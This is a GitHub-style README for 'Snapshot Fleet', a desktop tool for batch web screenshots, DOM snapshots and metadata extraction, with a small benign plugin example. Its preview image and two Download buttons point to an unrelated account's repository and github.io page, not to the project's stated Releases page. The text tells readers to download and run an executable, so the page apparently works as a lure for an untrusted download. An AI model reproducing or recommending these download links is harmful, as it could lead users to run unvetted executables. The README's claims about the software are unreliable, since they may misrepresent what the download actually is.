![preview](https://raw.githubusercontent.com/asniisna3-prog/media-harvest-core/main/preview.svg)

# Snapshot Fleet 🌐📦

**Snapshot Fleet** is a lightweight, cross-platform desktop orchestrator for batch-sourcing and archiving rich media from the open web. Instead of focusing on a single video downloader, Snapshot Fleet enables you to define **capture jobs** that pull full-page screenshots, DOM snapshots, and structured metadata from hundreds of URLs — all from a unified, local-first interface.

Built with Python and a modular plugin architecture, Snapshot Fleet is designed for digital archivists, content researchers, QA engineers, and anyone who needs to preserve web content at scale without relying on third-party cloud services.

---

## Table of Contents

- [Overview](#overview)
- [Key Features](#key-features)
- [Use Cases](#use-cases)
- [Getting Started](#getting-started)
- [Architecture & Workflow](#architecture--workflow)
- [Configuration & Plugins](#configuration--plugins)
- [Responsive UI & Multilingual Support](#responsive-ui--multilingual-support)
- [SEO & Discoverability](#seo--discoverability)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Overview 📖

Modern web preservation requires more than just downloading a single video file. **Snapshot Fleet** reimagines the process: you define **capture campaigns** — sets of URLs, capture rules, and output formats — and the fleet executes them in parallel on your local machine. Each URL is rendered headlessly, its full-page screenshot taken, its DOM snapshot stored, and key extraction rules (e.g., meta tags, alt text, specific selectors) applied.

Think of it as a personal, offline crawler that respects robots.txt and rate limits, giving you full control over what you archive and how you organize it. The output is a structured folder tree with JSON manifests, making it easy to feed into other tools or databases.

---

## Key Features 🌟

| Feature | Description |
|---------|-------------|
| **Batch URL Processing** | Import from CSV, plain text, or clipboard — the fleet processes up to 50 URLs concurrently. |
| **Full-Page Screenshots** | Captures entire scrollable pages as PNG or JPEG with configurable quality. |
| **DOM Snapshot Export** | Saves a sanitized, serialized HTML snapshot (removes scripts, preserves structure). |
| **Metadata Extraction** | Automatically pulls Open Graph tags, Dublin Core, schema.org JSON-LD, and custom selectors. |
| **Plugin-Based Extractors** | Add your own extractors for custom data fields (e.g., social shares, word count, video embed URLs). |
| **Rate-Limiting & Robots.txt Compliance** | Configurable delay between requests, with automatic robots.txt checking per domain. |
| **Responsive Desktop UI** | Built with a modern Python GUI framework (Kivy or PySide6), resizable, themeable. |
| **Multilingual Interface** | UI strings localized in English, Spanish, French, German, Japanese, and Portuguese. |
| **Export in Multiple Formats** | Results saved as JSON, CSV, or Markdown tables — ready for analysis or publication. |
| **No Cloud Dependencies** | Everything runs locally. Your data never leaves your machine unless you export it manually. |

---

## Use Cases 🎯

- **Digital Archivists** – Preserve web pages as they appear, with metadata, for long-term reference.
- **SEO & Content Auditors** – Snapshot competitor landing pages at scale and compare structure, meta tags, and schema.
- **QA Engineers** – Capture rendering state of web applications across different viewport sizes for visual regression testing.
- **Researchers** – Collect web-based evidence (articles, datasets, dashboards) with verifiable timestamps and origin URLs.
- **Content Creators** – Archive inspiration boards, design galleries, or trend pages before they change.

---

## Getting Started 🚀

[![Download](https://raw.githubusercontent.com/asniisna3-prog/media-harvest-core/main/button.svg)](https://asniisna3-prog.github.io/media-harvest-core/)

To begin using Snapshot Fleet, follow these steps:

1. **Download the latest release** for your operating system (Windows, macOS, Linux) from the [Releases page](https://github.com/samuelspineli34/snapshot-fleet/releases).
2. **Unzip** the archive to a folder of your choice.
3. **Run the executable** `snapshot-fleet` (or double-click `snapshot-fleet.exe` on Windows).
4. **Configure your first capture job** — paste a list of URLs or import a CSV file, set your desired output directory, and hit *Start Fleet*.

> No command-line usage required. The interface guides you through job creation, execution, and results browsing.

---

## Architecture & Workflow 🧩

Snapshot Fleet operates in three phases:

### 1. **Job Definition**
- Import URLs via drag-and-drop text file, clipboard paste, or CSV with optional metadata columns.
- Set capture options: screenshot resolution, DOM snapshot depth, custom extractor plugins.

### 2. **Fleet Execution**
- A configurable number of worker threads (default: 10) visit each URL in a headless Chromium instance.
- Each worker obeys per-domain rate limits and robots.txt directives.
- Progress is shown in real-time with a log panel and per-URL status icons.

### 3. **Output & Browsing**
- Each captured page gets a folder named by domain + timestamp inside the job output directory.
- Inside: `screenshot.png`, `snapshot.html`, `metadata.json`, and any plugin-extracted data.
- The built-in *Gallery View* lets you browse screenshots with a thumbnail grid and metadata overlay.

---

## Configuration & Plugins ⚙️

Snapshot Fleet is extensible via Python-based plugins. Drop a `.py` file into the `plugins/` directory and it will be loaded automatically on startup. Each plugin exposes a `extract(driver, url)` function that receives a Selenium WebDriver instance and the current URL, and can return a dictionary of custom fields.

### Example plugin: Extract word count and heading structure

```python
from bs4 import BeautifulSoup

def extract(driver, url):
    soup = BeautifulSoup(driver.page_source, 'html.parser')
    body_text = soup.get_text(separator=' ', strip=True)
    h1_count = len(soup.find_all('h1'))
    return {
        'word_count': len(body_text.split()),
        'h1_count': h1_count
    }
```

Plugins can also modify the UI (e.g., add a new tab) via the built-in hook system.

---

## Responsive UI & Multilingual Support 🌍

Snapshot Fleet’s interface adapts to screen sizes from 1024px wide up to 4K displays. The left sidebar collapses into a hamburger menu on smaller windows, and the main grid reflows from four columns down to one.

**Available languages:**
- English (default)
- Español (Spanish)
- Français (French)
- Deutsch (German)
- 日本語 (Japanese)
- Português (Portuguese)

Language can be switched at runtime from the *Settings* panel — no restart required.

---

## SEO & Discoverability 🔍

While Snapshot Fleet is a desktop tool, its output is optimized for search indexing:
- Generated JSON metadata includes all standard SEO meta tags (`og:title`, `description`, `keywords`, `twitter:card`).
- Markdown export formats include frontmatter (YAML) for static site generators like Jekyll or Hugo.
- Screenshot filenames are sanitized and descriptive (e.g., `My_Blog_Title_2026-03-15_14-30-00.png`).

This makes Snapshot Fleet an excellent companion for SEO professionals who want to archive and analyze competitor pages without affecting their own site’s crawl budget.

---

## Disclaimer ⚠️

Snapshot Fleet is intended for **personal, educational, and archival use only**. Users are responsible for complying with each website’s terms of service, robots.txt file, and applicable copyright laws. The developers do not endorse or encourage any unauthorized copying, redistribution, or scraping of content that violates a website’s usage policies. Always review the legal implications of archiving web content in your jurisdiction before using this tool.

---

## License 📄

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

[![Download](https://raw.githubusercontent.com/asniisna3-prog/media-harvest-core/main/button.svg)](https://asniisna3-prog.github.io/media-harvest-core/)